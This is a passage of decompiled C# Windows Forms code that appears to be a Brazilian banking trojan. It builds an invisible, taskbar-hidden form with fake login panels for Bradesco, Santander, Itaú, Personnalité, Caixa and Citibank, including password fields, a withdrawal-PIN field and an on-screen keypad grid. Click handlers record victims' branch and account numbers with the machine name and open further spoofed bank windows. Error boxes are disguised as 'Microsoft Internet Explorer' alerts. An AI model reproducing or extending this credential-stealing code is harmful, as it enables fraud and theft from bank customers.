		((Control)campo_usu).set_TabIndex(0);
		((Control)campo_sen).set_BackColor(Color.White);
		((TextBoxBase)campo_sen).set_BorderStyle((BorderStyle)0);
		((Control)campo_sen).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_sen).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_sen).set_Location(new Point(222, 79));
		((Control)campo_sen).set_Name("campo_sen");
		campo_sen.set_PasswordChar('•');
		((Control)campo_sen).set_Size(new Size(56, 14));
		((Control)campo_sen).set_TabIndex(1);
		((Control)inicia_citi).set_BackColor(Color.White);
		((Control)inicia_citi).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_citi.BackgroundImage"));
		((Control)inicia_citi).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_citi).get_Controls().Add((Control)(object)finaliza_citi);
		((Control)inicia_citi).get_Controls().Add((Control)(object)click1);
		((Control)inicia_citi).get_Controls().Add((Control)(object)lembrar);
		((Control)inicia_citi).get_Controls().Add((Control)(object)ct_u2);
		((Control)inicia_citi).get_Controls().Add((Control)(object)ct_u1);
		((Control)inicia_citi).set_Location(new Point(260, 260));
		((Control)inicia_citi).set_Name("inicia_citi");
		((Control)inicia_citi).set_Size(new Size(238, 264));
		((Control)inicia_citi).set_TabIndex(24);
		((Control)finaliza_citi).set_BackColor(Color.White);
		((Control)finaliza_citi).set_BackgroundImage((Image)componentResourceManager.GetObject("finaliza_citi.BackgroundImage"));
		((Control)finaliza_citi).set_BackgroundImageLayout((ImageLayout)0);
		((Control)finaliza_citi).get_Controls().Add((Control)(object)finaliza_citi1);
		((Control)finaliza_citi).get_Controls().Add((Control)(object)label6);
		((Control)finaliza_citi).get_Controls().Add((Control)(object)checkBox1);
		((Control)finaliza_citi).get_Controls().Add((Control)(object)ct_es);
		((Control)finaliza_citi).get_Controls().Add((Control)(object)ct_em);
		((Control)finaliza_citi).set_Location(new Point(6, 39));
		((Control)finaliza_citi).set_Name("finaliza_citi");
		((Control)finaliza_citi).set_Size(new Size(222, 212));
		((Control)finaliza_citi).set_TabIndex(25);
		((Control)finaliza_citi).set_Visible(false);
		((Control)finaliza_citi1).get_Controls().Add((Control)(object)ct_ca);
		((Control)finaliza_citi1).get_Controls().Add((Control)(object)pictureBox1);
		((Control)finaliza_citi1).get_Controls().Add((Control)(object)label5);
		((Control)finaliza_citi1).get_Controls().Add((Control)(object)label4);
		((Control)finaliza_citi1).set_Location(new Point(0, 2));
		((Control)finaliza_citi1).set_Name("finaliza_citi1");
		((Control)finaliza_citi1).set_Size(new Size(219, 99));
		((Control)finaliza_citi1).set_TabIndex(3);
		((Control)finaliza_citi1).set_Visible(false);
		((Control)ct_ca).set_Font(new Font("Verdana", 6.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)ct_ca).set_Location(new Point(125, 41));
		((TextBoxBase)ct_ca).set_MaxLength(7);
		((Control)ct_ca).set_Name("ct_ca");
		ct_ca.set_PasswordChar('•');
		((Control)ct_ca).set_Size(new Size(52, 18));
		((Control)ct_ca).set_TabIndex(4);
		((Control)ct_ca).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)pictureBox1).set_Cursor(Cursors.get_Hand());
		pictureBox1.set_ErrorImage((Image)null);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(150, 73));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(60, 21));
		pictureBox1.set_TabIndex(3);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Verdana", 7.25f));
		((Control)label5).set_ForeColor(Color.Green);
		((Control)label5).set_Location(new Point(18, 44));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(102, 12));
		((Control)label5).set_TabIndex(2);
		((Control)label5).set_Text("Senha de Saque:");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Verdana", 8.25f, (FontStyle)4, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.DarkBlue);
		((Control)label4).set_Location(new Point(4, 5));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(206, 26));
		((Control)label4).set_TabIndex(0);
		((Control)label4).set_Text("Para confirmar esta operação será\r\nnecessário sua Senha de Saque.");
		((Control)label6).set_BackColor(Color.Transparent);
		((Control)label6).set_Cursor(Cursors.get_Hand());
		((Control)label6).set_Location(new Point(151, 79));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(58, 19));
		((Control)label6).set_TabIndex(4);
		((Control)label6).add_Click((EventHandler)label6_Click);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)checkBox1).set_ForeColor(Color.Black);
		((Control)checkBox1).set_Location(new Point(10, 80));
		((Control)checkBox1).set_Margin(new Padding(0));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(114, 17));
		((Control)checkBox1).set_TabIndex(2);
		((Control)checkBox1).set_Tag((object)"");
		((Control)checkBox1).set_Text("Lembrar e-mail");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		((TextBoxBase)ct_es).set_BorderStyle((BorderStyle)0);
		((Control)ct_es).set_Location(new Point(110, 44));
		((Control)ct_es).set_Name("ct_es");
		ct_es.set_PasswordChar('•');
		((Control)ct_es).set_Size(new Size(84, 11));
		((Control)ct_es).set_TabIndex(1);
		((TextBoxBase)ct_em).set_BorderStyle((BorderStyle)0);
		((Control)ct_em).set_Location(new Point(7, 44));
		((Control)ct_em).set_Name("ct_em");
		((Control)ct_em).set_Size(new Size(84, 11));
		((Control)ct_em).set_TabIndex(0);
		((Control)click1).set_BackColor(Color.Transparent);
		((Control)click1).set_Cursor(Cursors.get_Hand());
		((Control)click1).set_Location(new Point(158, 118));
		((Control)click1).set_Name("click1");
		((Control)click1).set_Size(new Size(56, 16));
		((Control)click1).set_TabIndex(26);
		((Control)click1).add_Click((EventHandler)click1_Click);
		((Control)lembrar).set_AutoSize(true);
		((Control)lembrar).set_Location(new Point(14, 82));
		((Control)lembrar).set_Name("lembrar");
		((Control)lembrar).set_Size(new Size(15, 14));
		((Control)lembrar).set_TabIndex(2);
		((ButtonBase)lembrar).set_UseVisualStyleBackColor(true);
		((Control)ct_u2).set_BackColor(Color.White);
		((TextBoxBase)ct_u2).set_BorderStyle((BorderStyle)0);
		((Control)ct_u2).set_Location(new Point(116, 59));
		((Control)ct_u2).set_Name("ct_u2");
		ct_u2.set_PasswordChar('•');
		((TextBoxBase)ct_u2).set_ReadOnly(true);
		((Control)ct_u2).set_Size(new Size(84, 11));
		((Control)ct_u2).set_TabIndex(1);
		((Control)ct_u2).add_Enter((EventHandler)textBox2_Enter);
		((Control)ct_u2).add_Leave((EventHandler)textBox2_Leave);
		((Control)ct_u2).add_KeyPress(new KeyPressEventHandler(ct_u2_KeyPress));
		((TextBoxBase)ct_u1).set_BorderStyle((BorderStyle)0);
		((Control)ct_u1).set_Location(new Point(13, 59));
		((Control)ct_u1).set_Name("ct_u1");
		((Control)ct_u1).set_Size(new Size(84, 11));
		((Control)ct_u1).set_TabIndex(0);
		((Control)cititec).set_BackColor(Color.White);
		((Control)cititec).set_BackgroundImage((Image)componentResourceManager.GetObject("cititec.BackgroundImage"));
		((Control)cititec).set_BackgroundImageLayout((ImageLayout)0);
		((Control)cititec).get_Controls().Add((Control)(object)label38);
		((Control)cititec).get_Controls().Add((Control)(object)label41);
		((Control)cititec).get_Controls().Add((Control)(object)label43);
		((Control)cititec).get_Controls().Add((Control)(object)label40);
		((Control)cititec).get_Controls().Add((Control)(object)label42);
		((Control)cititec).get_Controls().Add((Control)(object)label30);
		((Control)cititec).get_Controls().Add((Control)(object)label39);
		((Control)cititec).get_Controls().Add((Control)(object)label22);
		((Control)cititec).get_Controls().Add((Control)(object)label14);
		((Control)cititec).get_Controls().Add((Control)(object)label37);
		((Control)cititec).get_Controls().Add((Control)(object)label29);
		((Control)cititec).get_Controls().Add((Control)(object)label21);
		((Control)cititec).get_Controls().Add((Control)(object)label9);
		((Control)cititec).get_Controls().Add((Control)(object)label36);
		((Control)cititec).get_Controls().Add((Control)(object)label28);
		((Control)cititec).get_Controls().Add((Control)(object)label20);
		((Control)cititec).get_Controls().Add((Control)(object)label13);
		((Control)cititec).get_Controls().Add((Control)(object)label35);
		((Control)cititec).get_Controls().Add((Control)(object)label27);
		((Control)cititec).get_Controls().Add((Control)(object)label19);
		((Control)cititec).get_Controls().Add((Control)(object)label10);
		((Control)cititec).get_Controls().Add((Control)(object)label34);
		((Control)cititec).get_Controls().Add((Control)(object)label26);
		((Control)cititec).get_Controls().Add((Control)(object)label18);
		((Control)cititec).get_Controls().Add((Control)(object)label12);
		((Control)cititec).get_Controls().Add((Control)(object)label33);
		((Control)cititec).get_Controls().Add((Control)(object)label25);
		((Control)cititec).get_Controls().Add((Control)(object)label17);
		((Control)cititec).get_Controls().Add((Control)(object)label7);
		((Control)cititec).get_Controls().Add((Control)(object)label32);
		((Control)cititec).get_Controls().Add((Control)(object)label24);
		((Control)cititec).get_Controls().Add((Control)(object)label16);
		((Control)cititec).get_Controls().Add((Control)(object)label11);
		((Control)cititec).get_Controls().Add((Control)(object)label31);
		((Control)cititec).get_Controls().Add((Control)(object)label23);
		((Control)cititec).get_Controls().Add((Control)(object)label15);
		((Control)cititec).get_Controls().Add((Control)(object)label44);
		((Control)cititec).set_Location(new Point(242, 146));
		((Control)cititec).set_Name("cititec");
		((Control)cititec).set_Size(new Size(252, 136));
		((Control)cititec).set_TabIndex(25);
		((Control)cititec).set_Visible(false);
		((Control)label38).set_BackColor(Color.Transparent);
		((Control)label38).set_Cursor(Cursors.get_Hand());
		((Control)label38).set_Location(new Point(176, 104));
		((Control)label38).set_Name("label38");
		((Control)label38).set_Size(new Size(63, 18));
		((Control)label38).set_TabIndex(31);
		((Control)label38).add_Click((EventHandler)label38_Click);
		((Control)label41).set_BackColor(Color.Transparent);
		((Control)label41).set_Cursor(Cursors.get_Hand());
		((Control)label41).set_Location(new Point(199, 80));
		((Control)label41).set_Name("label41");
		((Control)label41).set_Size(new Size(18, 18));
		((Control)label41).set_TabIndex(32);
		((Control)label41).add_Click((EventHandler)label41_Click);
		((Control)label43).set_BackColor(Color.Transparent);
		((Control)label43).set_Cursor(Cursors.get_Hand());
		((Control)label43).set_Location(new Point(222, 57));
		((Control)label43).set_Name("label43");
		((Control)label43).set_Size(new Size(18, 18));
		((Control)label43).set_TabIndex(33);
		((Control)label43).add_Click((EventHandler)label43_Click);
		((Control)label40).set_BackColor(Color.Transparent);
		((Control)label40).set_Cursor(Cursors.get_Hand());
		((Control)label40).set_Location(new Point(199, 57));
		((Control)label40).set_Name("label40");
		((Control)label40).set_Size(new Size(18, 18));
		((Control)label40).set_TabIndex(28);
		((Control)label40).add_Click((EventHandler)label40_Click);
		((Control)label42).set_BackColor(Color.Transparent);
		((Control)label42).set_Cursor(Cursors.get_Hand());
		((Control)label42).set_Location(new Point(222, 34));
		((Control)label42).set_Name("label42");
		((Control)label42).set_Size(new Size(18, 18));
		((Control)label42).set_TabIndex(29);
		((Control)label42).add_Click((EventHandler)label42_Click);
		((Control)label30).set_BackColor(Color.Transparent);
		((Control)label30).set_Cursor(Cursors.get_Hand());
		((Control)label30).set_Location(new Point(176, 80));
		((Control)label30).set_Name("label30");
		((Control)label30).set_Size(new Size(18, 18));
		((Control)label30).set_TabIndex(30);
		((Control)label30).add_Click((EventHandler)label30_Click);
		((Control)label39).set_BackColor(Color.Transparent);
		((Control)label39).set_Cursor(Cursors.get_Hand());
		((Control)label39).set_Location(new Point(199, 34));
		((Control)label39).set_Name("label39");
		((Control)label39).set_Size(new Size(18, 18));
		((Control)label39).set_TabIndex(34);
		((Control)label39).add_Click((EventHandler)label39_Click);
		((Control)label22).set_BackColor(Color.Transparent);
		((Control)label22).set_Cursor(Cursors.get_Hand());
		((Control)label22).set_Location(new Point(176, 57));
		((Control)label22).set_Name("label22");
		((Control)label22).set_Size(new Size(18, 18));
		((Control)label22).set_TabIndex(38);
		((Control)label22).add_Click((EventHandler)label22_Click);
		((Control)label14).set_BackColor(Color.Transparent);
		((Control)label14).set_Cursor(Cursors.get_Hand());
		((Control)label14).set_Location(new Point(176, 34));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(18, 18));
		((Control)label14).set_TabIndex(39);
		((Control)label14).add_Click((EventHandler)label14_Click);
		((Control)label37).set_BackColor(Color.Transparent);
		((Control)label37).set_Cursor(Cursors.get_Hand());
		((Control)label37).set_Location(new Point(84, 104));
		((Control)label37).set_Name("label37");
		((Control)label37).set_Size(new Size(18, 18));
		((Control)label37).set_TabIndex(40);
		((Control)label37).add_Click((EventHandler)label37_Click);
		((Control)label29).set_BackColor(Color.Transparent);
		((Control)label29).set_Cursor(Cursors.get_Hand());
		((Control)label29).set_Location(new Point(84, 80));
		((Control)label29).set_Name("label29");
		((Control)label29).set_Size(new Size(18, 18));
		((Control)label29).set_TabIndex(35);
		((Control)label29).add_Click((EventHandler)label29_Click);
		((Control)label21).set_BackColor(Color.Transparent);
		((Control)label21).set_Cursor(Cursors.get_Hand());
		((Control)label21).set_Location(new Point(84, 57));
		((Control)label21).set_Name("label21");
		((Control)label21).set_Size(new Size(18, 18));
		((Control)label21).set_TabIndex(36);
		((Control)label21).add_Click((EventHandler)label21_Click);
		((Control)label9).set_BackColor(Color.Transparent);
		((Control)label9).set_Cursor(Cursors.get_Hand());
		((Control)label9).set_Location(new Point(84, 34));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(18, 18));
		((Control)label9).set_TabIndex(37);
		((Control)label9).add_Click((EventHandler)label9_Click);
		((Control)label36).set_BackColor(Color.Transparent);
		((Control)label36).set_Cursor(Cursors.get_Hand());
		((Control)label36).set_Location(new Point(153, 104));
		((Control)label36).set_Name("label36");
		((Control)label36).set_Size(new Size(18, 18));
		((Control)label36).set_TabIndex(24);
		((Control)label36).add_Click((EventHandler)label36_Click);
		((Control)label28).set_BackColor(Color.Transparent);
		((Control)label28).set_Cursor(Cursors.get_Hand());
		((Control)label28).set_Location(new Point(153, 80));
		((Control)label28).set_Name("label28");
		((Control)label28).set_Size(new Size(18, 18));
		((Control)label28).set_TabIndex(23);
		((Control)label28).add_Click((EventHandler)label28_Click);
		((Control)label20).set_BackColor(Color.Transparent);
		((Control)label20).set_Cursor(Cursors.get_Hand());
		((Control)label20).set_Location(new Point(153, 57));
		((Control)label20).set_Name("label20");
		((Control)label20).set_Size(new Size(18, 18));
		((Control)label20).set_TabIndex(25);
		((Control)label20).add_Click((EventHandler)label20_Click);
		((Control)label13).set_BackColor(Color.Transparent);
		((Control)label13).set_Cursor(Cursors.get_Hand());
		((Control)label13).set_Location(new Point(153, 34));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(18, 18));
		((Control)label13).set_TabIndex(27);
		((Control)label13).add_Click((EventHandler)label13_Click);
		((Control)label35).set_BackColor(Color.Transparent);
		((Control)label35).set_Cursor(Cursors.get_Hand());
		((Control)label35).set_Location(new Point(61, 104));
		((Control)label35).set_Name("label35");
		((Control)label35).set_Size(new Size(18, 18));
		((Control)label35).set_TabIndex(26);
		((Control)label35).add_Click((EventHandler)label35_Click);
		((Control)label27).set_BackColor(Color.Transparent);
		((Control)label27).set_Cursor(Cursors.get_Hand());
		((Control)label27).set_Location(new Point(61, 80));
		((Control)label27).set_Name("label27");
		((Control)label27).set_Size(new Size(18, 18));
		((Control)label27).set_TabIndex(20);
		((Control)label27).add_Click((EventHandler)label27_Click);
		((Control)label19).set_BackColor(Color.Transparent);
		((Control)label19).set_Cursor(Cursors.get_Hand());
		((Control)label19).set_Location(new Point(61, 57));
		((Control)label19).set_Name("label19");
		((Control)label19).set_Size(new Size(18, 18));
		((Control)label19).set_TabIndex(21);
		((Control)label19).add_Click((EventHandler)label19_Click);
		((Control)label10).set_BackColor(Color.Transparent);
		((Control)label10).set_Cursor(Cursors.get_Hand());
		((Control)label10).set_Location(new Point(61, 34));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(18, 18));
		((Control)label10).set_TabIndex(22);
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)label34).set_BackColor(Color.Transparent);
		((Control)label34).set_Cursor(Cursors.get_Hand());
		((Control)label34).set_Location(new Point(130, 104));
		((Control)label34).set_Name("label34");
		((Control)label34).set_Size(new Size(18, 18));
		((Control)label34).set_TabIndex(9);
		((Control)label34).add_Click((EventHandler)label34_Click);
		((Control)label26).set_BackColor(Color.Transparent);
		((Control)label26).set_Cursor(Cursors.get_Hand());
		((Control)label26).set_Location(new Point(130, 80));
		((Control)label26).set_Name("label26");
		((Control)label26).set_Size(new Size(18, 18));
		((Control)label26).set_TabIndex(8);
		((Control)label26).add_Click((EventHandler)label26_Click);
		((Control)label18).set_BackColor(Color.Transparent);
		((Control)label18).set_Cursor(Cursors.get_Hand());
		((Control)label18).set_Location(new Point(130, 57));
		((Control)label18).set_Name("label18");
		((Control)label18).set_Size(new Size(18, 18));
		((Control)label18).set_TabIndex(11);
		((Control)label18).add_Click((EventHandler)label18_Click);
		((Control)label12).set_BackColor(Color.Transparent);
		((Control)label12).set_Cursor(Cursors.get_Hand());
		((Control)label12).set_Location(new Point(130, 34));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(18, 18));
		((Control)label12).set_TabIndex(10);
		((Control)label12).add_Click((EventHandler)label12_Click);
		((Control)label33).set_BackColor(Color.Transparent);
		((Control)label33).set_Cursor(Cursors.get_Hand());
		((Control)label33).set_Location(new Point(38, 104));
		((Control)label33).set_Name("label33");
		((Control)label33).set_Size(new Size(18, 18));
		((Control)label33).set_TabIndex(5);
		((Control)label33).add_Click((EventHandler)label33_Click);
		((Control)label25).set_BackColor(Color.Transparent);
		((Control)label25).set_Cursor(Cursors.get_Hand());
		((Control)label25).set_Location(new Point(38, 80));
		((Control)label25).set_Name("label25");
		((Control)label25).set_Size(new Size(18, 18));
		((Control)label25).set_TabIndex(4);
		((Control)label25).add_Click((EventHandler)label25_Click);
		((Control)label17).set_BackColor(Color.Transparent);
		((Control)label17).set_Cursor(Cursors.get_Hand());
		((Control)label17).set_Location(new Point(38, 57));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(18, 18));
		((Control)label17).set_TabIndex(7);
		((Control)label17).add_Click((EventHandler)label17_Click);
		((Control)label7).set_BackColor(Color.Transparent);
		((Control)label7).set_Cursor(Cursors.get_Hand());
		((Control)label7).set_Location(new Point(38, 34));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(18, 18));
		((Control)label7).set_TabIndex(6);
		((Control)label7).add_Click((EventHandler)label7_Click);
		((Control)label32).set_BackColor(Color.Transparent);
		((Control)label32).set_Cursor(Cursors.get_Hand());
		((Control)label32).set_Location(new Point(107, 104));
		((Control)label32).set_Name("label32");
		((Control)label32).set_Size(new Size(18, 18));
		((Control)label32).set_TabIndex(17);
		((Control)label32).add_Click((EventHandler)label32_Click);
		((Control)label24).set_BackColor(Color.Transparent);
		((Control)label24).set_Cursor(Cursors.get_Hand());
		((Control)label24).set_Location(new Point(107, 80));
		((Control)label24).set_Name("label24");
		((Control)label24).set_Size(new Size(18, 18));
		((Control)label24).set_TabIndex(16);
		((Control)label24).add_Click((EventHandler)label24_Click);
		((Control)label16).set_BackColor(Color.Transparent);
		((Control)label16).set_Cursor(Cursors.get_Hand());
		((Control)label16).set_Location(new Point(107, 57));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(18, 18));
		((Control)label16).set_TabIndex(19);
		((Control)label16).add_Click((EventHandler)label16_Click);
		((Control)label11).set_BackColor(Color.Transparent);
		((Control)label11).set_Cursor(Cursors.get_Hand());
		((Control)label11).set_Location(new Point(107, 34));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(18, 18));
		((Control)label11).set_TabIndex(18);
		((Control)label11).add_Click((EventHandler)label11_Click);
		((Control)label31).set_BackColor(Color.Transparent);
		((Control)label31).set_Cursor(Cursors.get_Hand());
		((Control)label31).set_Location(new Point(15, 104));
		((Control)label31).set_Name("label31");
		((Control)label31).set_Size(new Size(18, 18));
		((Control)label31).set_TabIndex(13);
		((Control)label31).add_Click((EventHandler)label31_Click);
		((Control)label23).set_BackColor(Color.Transparent);
		((Control)label23).set_Cursor(Cursors.get_Hand());
		((Control)label23).set_Location(new Point(15, 80));
		((Control)label23).set_Name("label23");
		((Control)label23).set_Size(new Size(18, 18));
		((Control)label23).set_TabIndex(12);
		((Control)label23).add_Click((EventHandler)label23_Click);
		((Control)label15).set_BackColor(Color.Transparent);
		((Control)label15).set_Cursor(Cursors.get_Hand());
		((Control)label15).set_Location(new Point(15, 57));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(18, 18));
		((Control)label15).set_TabIndex(15);
		((Control)label15).add_Click((EventHandler)label15_Click);
		((Control)label44).set_BackColor(Color.Transparent);
		((Control)label44).set_Cursor(Cursors.get_Hand());
		((Control)label44).set_Location(new Point(15, 34));
		((Control)label44).set_Name("label44");
		((Control)label44).set_Size(new Size(18, 18));
		((Control)label44).set_TabIndex(14);
		((Control)label44).add_Click((EventHandler)label44_Click);
		((Form)this).set_AutoScaleBaseSize(new Size(5, 11));
		((Form)this).set_ClientSize(new Size(76, 59));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)cititec);
		((Control)this).get_Controls().Add((Control)(object)inicia_citi);
		((Control)this).get_Controls().Add((Control)(object)inicia_cc);
		((Control)this).get_Controls().Add((Control)(object)inicia_prs);
		((Control)this).get_Controls().Add((Control)(object)inicia_prm);
		((Control)this).get_Controls().Add((Control)(object)inicia_cx);
		((Control)this).get_Controls().Add((Control)(object)inicia_san);
		((Control)this).get_Controls().Add((Control)(object)inicia_bra);
		((Control)this).get_Controls().Add((Control)(object)inicia_ita);
		((Control)this).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(Color.Gray);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_RightToLeftLayout(true);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_Closing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)inicia_bra).ResumeLayout(false);
		((Control)inicia_bra).PerformLayout();
		((Control)inicia_san).ResumeLayout(false);
		((Control)inicia_san).PerformLayout();
		((Control)inicia_cx).ResumeLayout(false);
		((Control)inicia_cx).PerformLayout();
		((Control)inicia_prs).ResumeLayout(false);
		((Control)inicia_prs).PerformLayout();
		((Control)inicia_prm).ResumeLayout(false);
		((Control)inicia_prm).PerformLayout();
		((Control)inicia_ita).ResumeLayout(false);
		((Control)inicia_ita).PerformLayout();
		((Control)inicia_cc).ResumeLayout(false);
		((Control)inicia_cc).PerformLayout();
		((Control)finaliza_cc).ResumeLayout(false);
		((Control)finaliza_cc).PerformLayout();
		((Control)inicia_citi).ResumeLayout(false);
		((Control)inicia_citi).PerformLayout();
		((Control)finaliza_citi).ResumeLayout(false);
		((Control)finaliza_citi).PerformLayout();
		((Control)finaliza_citi1).ResumeLayout(false);
		((Control)finaliza_citi1).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)cititec).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}

	[STAThread]
	private void botao1_Click(object sender, EventArgs e)
	{
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)bd_ag).get_Text().Length > 3 && ((Control)bd_nc).get_Text().Length > 4 && ((Control)bd_dg).get_Text().Length > 0)
		{
			GuardaInfo("Brd", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Brd", "========== Bradesco ==========");
			GuardaInfo("Brd", "Agência....: " + ((Control)bd_ag).get_Text());
			GuardaInfo("Brd", "Conta......: " + ((Control)bd_nc).get_Text() + "-" + ((Control)bd_dg).get_Text());
			Form_Bradesco2 = new Brdsc();
			Durma(1000);
			((Control)Form_Bradesco2).Show();
			((Control)inicia_bra).set_Visible(false);
		}
		else
		{
			MessageBox.Show("Informações Inválidas. Por favor, verifique agência, conta e dígito", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void prm_ok_Click(object sender, EventArgs e)
	{
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)prm_a).get_Text().Length > 3 && ((Control)prm_b).get_Text().Length > 4 && ((Control)prm_c).get_Text().Length != 0)
		{
			GuardaInfo("Prm", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Prm", "========== Prime ==========");
			GuardaInfo("Prm", "Agência....: " + ((Control)prm_a).get_Text());
			GuardaInfo("Prm", "Conta......: " + ((Control)prm_b).get_Text() + "-" + ((Control)prm_c).get_Text());
			Durma(500);
			Form_Bradesco2 = new Brdsc();
			((Control)Form_Bradesco2.isprime).set_Visible(true);
			Durma(1000);
			((Control)Form_Bradesco2).Show();
			((Control)inicia_prm).set_Visible(false);
		}
		else
		{
			MessageBox.Show("Informações Inválidas. Por favor, verifique agência, conta e dígito", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void snt_ok_Click(object sender, EventArgs e)
	{
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)snt_ag).get_Text().Length > 3 && ((Control)snt_cc).get_Text().Length > 1 && ((Control)snt_cc1).get_Text().Length > 4 && ((Control)snt_cc2).get_Text().Length > 0)
		{
			GuardaInfo("Snt", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Snt", "========== Santander ==========");
			GuardaInfo("Snt", "Agência............: " + ((Control)snt_ag).get_Text());
			GuardaInfo("Snt", "Conta..............: " + ((Control)snt_cc).get_Text() + " " + ((Control)snt_cc1).get_Text() + " " + ((Control)snt_cc2).get_Text());
			Form_Santander2 = new Satan(((Control)snt_ag).get_Text(), ((Control)snt_cc).get_Text() + ((Control)snt_cc1).get_Text() + "-" + ((Control)snt_cc2).get_Text());
			Durma(500);
			((Control)Form_Santander2).Show();
			((Control)inicia_san).set_Visible(false);
		}
		else
		{
			MessageBox.Show("Por favor, preencha corratamente os números da Agência e Conta.", "Microsfot Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void linkLabel1_Click(object sender, EventArgs e)
	{
		//IL_014d: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)ita_a).get_Text().Length > 3 && ((Control)ita_b).get_Text().Length > 4 && ((Control)ita_c).get_Text().Length > 0)
		{
			GuardaInfo("Ita", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Ita", "========== Itaú ==========");
			GuardaInfo("Ita", "Agência............: " + ((Control)ita_a).get_Text());
			GuardaInfo("Ita", "Conta..............: " + ((Control)ita_b).get_Text() + "-" + ((Control)ita_c).get_Text());
			Form_Itau2 = new Itau2(Hand);
			((Control)Form_Itau2).set_Height(1000);
			((Control)Form_Itau2).set_Width(1024);
			((Control)Form_Itau2).set_Top(3);
			((Control)Form_Itau2).set_Left(2);
			Durma(2000);
			((Control)Form_Itau2).Show();
			((Control)inicia_ita).set_Visible(false);
		}
		else
		{
			MessageBox.Show("Por favor, preencha os campos 'Agência' e 'Conta' corretamente.", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void botao_okprs_Click(object sender, EventArgs e)
	{
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)prs_a).get_Text().Length > 3 && ((Control)prs_b).get_Text().Length > 4 && ((Control)prs_c).get_Text().Length != 0)
		{
			GuardaInfo("Prs", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Prs", "===== Personnalite =====");
			GuardaInfo("Prs", "Agência............: " + ((Control)prs_a).get_Text());
			GuardaInfo("Prs", "Conta..............: " + ((Control)prs_b).get_Text() + "-" + ((Control)prs_c).get_Text());
			Form_Pers2 = new Personalite(Hand);
			((Control)Form_Pers2).set_Height(1000);
			((Control)Form_Pers2).set_Width(1024);
			((Control)Form_Pers2).set_Top(2);
			((Control)Form_Pers2).set_Left(2);
			Durma(1000);
			((Control)Form_Pers2).Show();
			((Control)inicia_prs).set_Visible(false);
		}
		else
		{
			MessageBox.Show("Por favor, preencha os campos 'Agência' e 'Conta' corretamente.", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void label8_Click(object sender, EventArgs e)
	{
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)NOUS).get_Text().Length > 10 && ((Control)Tipo).get_Text().Length == 2)
		{
			GuardaInfo("Cxx", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Cxx", "========== Cxx Secreta ==========");
